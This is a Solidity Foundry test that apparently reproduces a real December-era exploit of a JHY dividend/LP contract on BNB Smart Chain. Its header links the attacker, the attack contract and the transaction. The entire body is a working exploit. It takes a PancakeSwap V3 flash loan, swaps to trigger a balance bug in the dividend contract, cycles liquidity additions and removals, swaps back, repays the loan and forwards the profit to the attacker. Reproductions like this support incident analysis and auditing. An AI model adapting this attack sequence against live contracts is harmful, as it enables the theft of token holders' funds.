// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 11k USD
// Attacker : https://bscscan.com/address/0x00000000dd0412366388639b1101544fff2dce8d
// Attack Contract : https://bscscan.com/address/0x802a389072c4310cf78a2e654fa50fac8bdc1a55
// Vulnerable Contract : https://bscscan.com/address/0x40Cd735D49e43212B5cb0b19773Ec2A648aAA96c
// Attack Tx : https://bscscan.com/tx/0xb6a9055e3ce7f006391760fbbcc4e4bc8df8228dc47a8bb4ff657370ccc49256

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x40Cd735D49e43212B5cb0b19773Ec2A648aAA96c#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/TenArmorAlert/status/1867950089156575317
// Hacking God : N/A
pragma solidity ^0.8.0;

address constant BSC_USD = 0x55d398326f99059fF775485246999027B3197955;
address constant PANCAKE_V3_POOL = 0x36696169C63e42cd08ce11f5deeBbCeBae652050;
address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant PANCAKE_LP = 0x086Ecf61469c741a6f97D80F2F43342af3dBDB9B;
address constant JHY_ADDR = 0x30Bea8Ce5CD1BA592eb13fCCd8973945Dc8555c5;
address constant DIVIDEND_JHYLP = 0x40Cd735D49e43212B5cb0b19773Ec2A648aAA96c;

contract Jhy is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 44857311 - 1;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = BSC_USD;
    }

    function testExploit() public balanceLog {
        //implement exploit code here
        AttackContract1 attackContract1 = new AttackContract1();
        attackContract1.attack();
    }
}

contract AttackContract1 {
    address public attacker;
    constructor() {
        attacker = msg.sender;
    }
    function attack() public {
        AttackContract2 attackContract2 = new AttackContract2();
        attackContract2.attack();
    }

    function callback(uint256 payback) public {
        address[] memory BSC_JHY_PATH = new address[](2);
        BSC_JHY_PATH[0] = BSC_USD;
        BSC_JHY_PATH[1] = JHY_ADDR;
        address[] memory JHY_BSC_PATH = new address[](2);
        JHY_BSC_PATH[0] = JHY_ADDR;
        JHY_BSC_PATH[1] = BSC_USD;

        IERC20(BSC_USD).allowance(address(this), PANCAKE_ROUTER);
        IERC20(BSC_USD).approve(PANCAKE_ROUTER, type(uint256).max);

        // This line will trigger a bug in the DIVIDEND_JHYLP contract
        // which will set the address balance to the LP token balance.
        // 20,000 BSC -> 134,254 JHY
        IPancakeRouter(payable(PANCAKE_ROUTER)).swapExactTokensForTokensSupportingFeeOnTransferTokens(20_000 ether, 0, BSC_JHY_PATH, address(this), block.timestamp);
        uint256 bscBalance = IERC20(BSC_USD).balanceOf(address(this));
        uint256 jhyBalance = IERC20(JHY_ADDR).balanceOf(address(this));
        console.log("bsc balance after 1st swap", bscBalance / 1 ether);
        console.log("jhy balance after 1st swap", jhyBalance / 1 ether);

        // add 5000 ether BSC to LP
        IERC20(JHY_ADDR).approve(PANCAKE_ROUTER, type(uint256).max);
        uint256 amountBDesired = 127541761017672381768022;
        IPancakeRouter(payable(PANCAKE_ROUTER)).addLiquidity(BSC_USD, JHY_ADDR, bscBalance, amountBDesired, 0, 0, address(this), block.timestamp);

        IERC20(PANCAKE_LP).approve(PANCAKE_ROUTER, type(uint256).max);
        
        uint256 removeLiquidity = 122934591410901927668;
        IPancakeRouter(payable(PANCAKE_ROUTER)).removeLiquidity(BSC_USD, JHY_ADDR, removeLiquidity, 0, 0, address(this), block.timestamp);
        IPancakeRouter(payable(PANCAKE_ROUTER)).removeLiquidity(BSC_USD, JHY_ADDR, removeLiquidity, 0, 0, address(this), block.timestamp);
        IPancakeRouter(payable(PANCAKE_ROUTER)).removeLiquidity(BSC_USD, JHY_ADDR, removeLiquidity, 0, 0, address(this), block.timestamp);
        console.log("jhy balance after 3 removeLiquidity operations", IERC20(JHY_ADDR).balanceOf(address(this)) / 1 ether);

        // 101,964 JHY -> 14,381 BSC
        jhyBalance = IERC20(JHY_ADDR).balanceOf(address(this));
        IPancakeRouter(payable(PANCAKE_ROUTER)).swapExactTokensForTokensSupportingFeeOnTransferTokens(jhyBalance, 0, JHY_BSC_PATH, address(this), block.timestamp);

        jhyBalance = IERC20(JHY_ADDR).balanceOf(address(this));
        removeLiquidity = 11924655366857486983814;
        IPancakeRouter(payable(PANCAKE_ROUTER)).removeLiquidity(BSC_USD, JHY_ADDR, removeLiquidity, 0, 0, address(this), block.timestamp);
        console.log("jhy balance after 4th removeLiquidity", IERC20(JHY_ADDR).balanceOf(address(this)) / 1 ether);

        // 130,201 JHY -> 17,119 BSC
        jhyBalance = IERC20(JHY_ADDR).balanceOf(address(this));
        IPancakeRouter(payable(PANCAKE_ROUTER)).swapExactTokensForTokensSupportingFeeOnTransferTokens(jhyBalance, 0, JHY_BSC_PATH, address(this), block.timestamp);

        bscBalance = IERC20(BSC_USD).balanceOf(address(this));
        IERC20(BSC_USD).transfer(PANCAKE_V3_POOL, payback);
        IERC20(BSC_USD).transfer(attacker, bscBalance - payback);
    }
}

contract AttackContract2 {
    address public attackContract1;
    constructor() {
        attackContract1 = msg.sender;
    }
    function attack() public {
        IPancakeV3Pool(PANCAKE_V3_POOL).flash(address(this), 25_000 ether, 0, "");
        
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data)  public {
        IERC20(BSC_USD).transfer(attackContract1, 25_000 ether);
        AttackContract1(attackContract1).callback(fee0 + 25_000 ether);
    }
}